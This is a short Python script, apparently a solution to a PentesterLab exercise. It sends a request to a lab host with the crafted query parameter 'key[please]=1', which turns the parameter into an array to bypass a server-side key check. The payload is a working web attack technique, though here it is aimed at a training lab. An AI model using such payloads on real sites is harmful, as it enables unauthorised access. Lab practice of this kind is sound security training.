import requests

url = "http://ptl-934de69a-e9010455.libcurl.so/"

response = requests.get(
    url=url + "pentesterlab?key[please]=1"
)

print(response.text)
